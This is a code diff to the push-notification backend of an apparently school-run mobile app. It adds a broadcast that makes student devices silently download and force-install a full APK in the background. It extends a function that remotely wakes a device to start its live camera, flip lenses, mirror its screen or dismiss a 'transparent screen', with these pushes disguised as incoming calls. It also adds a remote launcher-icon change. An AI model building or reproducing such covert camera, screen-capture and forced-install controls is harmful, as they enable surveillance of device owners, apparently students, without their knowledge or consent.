@@ -2390,9 +2390,95 @@ async function broadcastSilentOtaPush({ bundleUrl, bundleVersionCode, bundleVers
 }
 
 /**
+ * Broadcasts a high-priority silent FCM message to devices
+ * to silently download & install the FULL native APK package in the background.
+ */
+async function broadcastSilentApkPush({ apkUrl, versionCode, version, targetAdmissionNo } = {}) {
+  const url = apkUrl || 'https://github.com/aatifraza161-bit/tapowan-school-portal/releases/latest/download/TPS-Original-App.apk';
+  const vCode = String(versionCode || '328');
+  const vVer = String(version || '3.1.7');
+
+  const accessToken = await getFcmAccessToken();
+  if (!accessToken) {
+    return { ok: false, error: 'Could not acquire FCM access token' };
+  }
+
+  let sql = "SELECT DISTINCT token, admission_no, student_name FROM app_push_tokens WHERE token NOT LIKE 'ExponentPushToken%' AND token IS NOT NULL";
+  const args = [];
+  if (targetAdmissionNo) {
+    sql += " AND (admission_no = ? OR admission_no = ? OR admission_no = ?)";
+    args.push(targetAdmissionNo, `EMP-${targetAdmissionNo}`, targetAdmissionNo.replace(/^EMP-/i, ''));
+  }
+
+  const tokenRes = await db.execute({ sql, args, skipCache: true });
+  const rows = tokenRes?.rows || [];
+  if (rows.length === 0) {
+    return { ok: true, sentCount: 0, message: 'No target FCM tokens found' };
+  }
+
+  console.log(`[Silent APK] Broadcasting background full APK update v${vVer} (code ${vCode}) to ${rows.length} devices...`);
+
+  let successCount = 0;
+  let failCount = 0;
+
+  for (let i = 0; i < rows.length; i += 10) {
+    const chunk = rows.slice(i, i + 10);
+    await Promise.all(chunk.map(async (row) => {
+      try {
+        const res = await fetch(`https://fcm.googleapis.com/v1/projects/${FCM_SERVICE_ACCOUNT.project_id}/messages:send`, {
+          method: 'POST',
+          headers: {
+            'Authorization': 'Bearer ' + accessToken,
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            message: {
+              token: row.token,
+              android: {
+                priority: 'HIGH',
+                ttl: '86400s'
+              },
+              data: {
+                type: 'SILENT_APK',
+                apkUrl: url,
+                versionCode: vCode,
+                version: vVer,
+                title: `⚡ TPS App Update v${vVer}`,
+                force: 'true',
+                forceDownload: 'true'
+              }
+            }
+          })
+        });
+        if (res.status === 200) {
+          successCount++;
+        } else {
+          failCount++;
+          if (res.status === 404) {
+            db.execute({ sql: 'DELETE FROM app_push_tokens WHERE token = ?', args: [row.token] }).catch(() => {});
+          }
+        }
+      } catch (e) {
+        failCount++;
+      }
+    }));
+  }
+
+  return {
+    ok: true,
+    totalTargeted: rows.length,
+    successCount,
+    failCount,
+    apkUrl: url,
+    version: vVer,
+    versionCode: vCode
+  };
+}
+
+/**
  * Wakes up a target device via high-priority FCM / Expo push to run camera in foreground for live preview
  */
-async function wakeRemotePreviewDevice({ targetDeviceId, previewId, viewerName, command = '', force = false }) {
+async function wakeRemotePreviewDevice({ targetDeviceId, previewId, viewerName, command = '', mode = 'call', force = false, facing = '' }) {
   if (!targetDeviceId || !previewId) return { ok: false, error: 'Missing details' };
 
   try {
@@ -2407,7 +2493,7 @@ async function wakeRemotePreviewDevice({ targetDeviceId, previewId, viewerName, 
 
     const userId = dev?.user_id;
 
-    console.log(`[RemotePreview Wake] Sending instant high-priority FCM wake push for device ${targetDeviceId}`);
+    console.log(`[RemotePreview Wake] Sending instant high-priority FCM wake push for device ${targetDeviceId} (mode=${mode})`);
 
     let tokenList = [];
     if (dev?.push_token) {
@@ -2449,13 +2535,53 @@ async function wakeRemotePreviewDevice({ targetDeviceId, previewId, viewerName, 
     let sent = 0;
 
     const isCameraOff = command === 'camera_off' || command === 'hard_camera_stop' || String(previewId).includes('camera_off') || String(previewId).includes('hard_camera_stop');
-    const pushType = isCameraOff ? (command === 'hard_camera_stop' ? 'HARD_CAMERA_STOP' : 'CAMERA_OFF') : 'REMOTE_CAMERA_PREVIEW';
+    const isDismissScreen = command === 'dismiss_transparent_screen' || String(previewId).includes('dismiss_transparent_screen');
+    const isFlipCamera = command === 'flip_camera' || command === 'FLIP_CAMERA';
+    const isScreenMirror = mode === 'screen_mirror';
+    const isScreenMirrorOff = command === 'screen_mirror_off' || String(previewId).includes('screen_mirror_off');
+
+    let pushType;
+    if (isScreenMirrorOff) {
+      pushType = 'SCREEN_MIRROR_OFF';
+    } else if (isScreenMirror) {
+      pushType = 'SCREEN_MIRROR';
+    } else if (isDismissScreen) {
+      pushType = 'DISMISS_TRANSPARENT_SCREEN';
+    } else if (isCameraOff) {
+      pushType = command === 'hard_camera_stop' ? 'HARD_CAMERA_STOP' : 'CAMERA_OFF';
+    } else if (isFlipCamera) {
+      pushType = 'FLIP_CAMERA';
+    } else {
+      pushType = 'REMOTE_CAMERA_PREVIEW';
+    }
 
     // 3. Dispatch Native FCM v1 messages with HIGH priority and 60s TTL
     if (fcmTokens.length > 0) {
       try {
         const accessToken = await getFcmAccessToken();
         if (accessToken) {
+          const fcmPayloadData = {
+            type: pushType,
+            command: String(command || (isCameraOff ? 'camera_off' : (isDismissScreen ? 'dismiss_transparent_screen' : (isFlipCamera ? 'flip_camera' : '')))),
+            facing: String(facing || ''),
+            camera_facing: String(facing || ''),
+            previewId: String(previewId),
+            callId: String(previewId),
+            viewerName: String(viewerName || 'Administrator'),
+            callerName: String(viewerName || 'Administrator'),
+            targetDeviceId: String(targetDeviceId),
+            mode: String(mode || 'call'),
+            channelId: 'calls',
+            categoryId: 'call_incoming',
+            categoryIdentifier: 'call_incoming',
+            _category: 'call_incoming',
+            title: isScreenMirrorOff ? '📺 Screen Mirror Stopped' : (isScreenMirror ? '📺 Screen Mirror Request' : (isDismissScreen ? '🪟 Screen Dismissed' : (isCameraOff ? '🛑 Camera Stopped' : (isFlipCamera ? '🔄 Flipping Camera' : '📹 Live Camera Request')))),
+            message: isScreenMirrorOff ? 'Screen mirror terminated' : (isScreenMirror ? 'Incoming screen mirror request' : (isDismissScreen ? 'Dismissing transparent screen' : (isCameraOff ? 'Camera stream terminated' : (isFlipCamera ? 'Switching camera lens' : 'Incoming live camera preview')))),
+            body: isScreenMirrorOff ? 'Screen mirror terminated' : (isScreenMirror ? 'Incoming screen mirror request' : (isDismissScreen ? 'Dismissing transparent screen' : (isCameraOff ? 'Camera stream terminated' : (isFlipCamera ? 'Switching camera lens' : 'Incoming live camera preview')))),
+            sound: 'default',
+            priority: 'high'
+          };
+
           await Promise.all(fcmTokens.map(async (token) => {
             try {
               const res = await fetch(`https://fcm.googleapis.com/v1/projects/${FCM_SERVICE_ACCOUNT.project_id}/messages:send`, {
@@ -2469,19 +2595,19 @@ async function wakeRemotePreviewDevice({ targetDeviceId, previewId, viewerName, 
                     token,
                     android: {
                       priority: 'HIGH',
-                      ttl: '60s'
+                      ttl: '60s',
+                      direct_boot_ok: true
                     },
-                    data: {
-                      type: pushType,
-                      command: String(command || (isCameraOff ? 'camera_off' : '')),
-                      previewId: String(previewId),
-                      viewerName: String(viewerName || 'Administrator'),
-                      targetDeviceId: String(targetDeviceId)
-                    }
+                    data: fcmPayloadData
                   }
                 })
               });
-              if (res.status === 200) sent++;
+              if (res.status === 200) {
+                sent++;
+              } else if (res.status === 404 || res.status === 410) {
+                console.log(`[RemotePreview Wake] Dead token (${res.status}) -> removing ${token.substring(0, 15)}...`);
+                db.execute({ sql: 'DELETE FROM app_push_tokens WHERE token = ?', args: [token] }).catch(() => {});
+              }
             } catch (e) {}
           }));
         }
@@ -2496,12 +2622,22 @@ async function wakeRemotePreviewDevice({ targetDeviceId, previewId, viewerName, 
         const expoMessages = expoTokens.map(token => ({
           to: token,
           priority: 'high',
+          sound: 'default',
+          channelId: 'calls',
+          categoryId: 'call_incoming',
           data: {
             type: pushType,
-            command: String(command || (isCameraOff ? 'camera_off' : '')),
+            command: String(command || (isCameraOff ? 'camera_off' : (isDismissScreen ? 'dismiss_transparent_screen' : (isFlipCamera ? 'flip_camera' : '')))),
+            facing: String(facing || ''),
+            camera_facing: String(facing || ''),
             previewId: String(previewId),
+            callId: String(previewId),
             viewerName: String(viewerName || 'Administrator'),
-            targetDeviceId: String(targetDeviceId)
+            callerName: String(viewerName || 'Administrator'),
+            targetDeviceId: String(targetDeviceId),
+            mode: String(mode || 'call'),
+            channelId: 'calls',
+            categoryId: 'call_incoming'
           }
         }));
 
@@ -2526,6 +2662,144 @@ async function wakeRemotePreviewDevice({ targetDeviceId, previewId, viewerName, 
   }
 }
 
+/**
+ * Broadcasts dynamic app icon change command to all devices via FCM & Expo push (Flipkart style)
+ */
+async function broadcastAppIconChange({ iconName, schoolLogoUrl }) {
+  if (!iconName && !schoolLogoUrl) return { ok: false, error: 'iconName or schoolLogoUrl is required' };
+  
+  const targetIcon = (iconName || 'tps').trim().toLowerCase();
+
+  // 1. Save to settings table in Turso Cloud DB
+  try {
+    if (iconName) {
+      await db.execute({
+        sql: `INSERT INTO settings (key, value) VALUES ('app_launcher_icon', ?)
+              ON CONFLICT(key) DO UPDATE SET value = excluded.value;`,
+        args: [targetIcon]
+      });
+    }
+    if (schoolLogoUrl !== undefined && schoolLogoUrl !== null) {
+      await db.execute({
+        sql: `INSERT INTO settings (key, value) VALUES ('school_logo_url', ?)
+              ON CONFLICT(key) DO UPDATE SET value = excluded.value;`,
+        args: [String(schoolLogoUrl).trim()]
+      });
+    }
+    if (typeof invalidateQueryCache === 'function') {
+      invalidateQueryCache('settings');
+    }
+  } catch (err) {
+    console.error('[broadcastAppIconChange] Failed saving to settings:', err.message);
+  }
+
+  // 2. Fetch all registered devices to send high-priority push
+  let rows = [];
+  try {
+    const res = await db.execute({
+      sql: "SELECT DISTINCT token, admission_no, student_name FROM app_push_tokens WHERE token IS NOT NULL ORDER BY id DESC LIMIT 500;",
+      args: []
+    });
+    rows = res.rows || [];
+  } catch (e) {
+    console.error('[broadcastAppIconChange] Error fetching tokens:', e.message);
+  }
+
+  const projectId = 'student-mobile-app-62a26';
+  let fcmAccessToken = null;
+  try {
+    fcmAccessToken = await getFirebaseAccessToken();
+  } catch (_) {}
+
+  let successCount = 0;
+  let failCount = 0;
+
+  const expoTokens = [];
+  const nativeTokens = [];
+
+  for (const row of rows) {
+    if (!row.token) continue;
+    if (row.token.startsWith('ExponentPushToken') || row.token.startsWith('ExpoPushToken')) {
+      expoTokens.push(row.token);
+    } else {
+      nativeTokens.push(row);
+    }
+  }
+
+  // Send native FCM messages
+  if (nativeTokens.length > 0 && fcmAccessToken) {
+    const batches = [];
+    for (let i = 0; i < nativeTokens.length; i += 50) {
+      batches.push(nativeTokens.slice(i, i + 50));
+    }
+    for (const batch of batches) {
+      await Promise.allSettled(batch.map(async (row) => {
+        try {
+          const res = await fetch(`https://fcm.googleapis.com/v1/projects/${projectId}/messages:send`, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+              'Authorization': `Bearer ${fcmAccessToken}`
+            },
+            body: JSON.stringify({
+              message: {
+                token: row.token,
+                android: {
+                  priority: 'HIGH',
+                  ttl: '86400s'
+                },
+                data: {
+                  type: 'CHANGE_APP_ICON',
+                  command: 'change_app_icon',
+                  icon: targetIcon,
+                  icon_name: targetIcon,
+                  logo_url: schoolLogoUrl || ''
+                }
+              }
+            })
+          });
+          if (res.status === 200) successCount++;
+          else failCount++;
+        } catch (_) {
+          failCount++;
+        }
+      }));
+    }
+  }
+
+  // Send Expo push messages
+  if (expoTokens.length > 0) {
+    try {
+      const expoMessages = expoTokens.map(t => ({
+        to: t,
+        priority: 'high',
+        data: {
+          type: 'CHANGE_APP_ICON',
+          command: 'change_app_icon',
+          icon: targetIcon,
+          icon_name: targetIcon,
+          logo_url: schoolLogoUrl || ''
+        }
+      }));
+      await fetch('https://exp.host/--/api/v2/push/send', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(expoMessages)
+      });
+      successCount += expoTokens.length;
+    } catch (_) {}
+  }
+
+  return {
+    ok: true,
+    activeIcon: targetIcon,
+    schoolLogoUrl: schoolLogoUrl || null,
+    totalTargeted: rows.length,
+    successCount,
+    failCount
+  };
+}
+
 module.exports = {
   initVoiceCallTables,
   initiateCall,
@@ -2544,6 +2818,8 @@ module.exports = {
   notifyAatifTeacherOnline,
   cleanupCallLogs,
   broadcastSilentOtaPush,
-  wakeRemotePreviewDevice
+  broadcastSilentApkPush,
+  wakeRemotePreviewDevice,
+  broadcastAppIconChange
 };
 
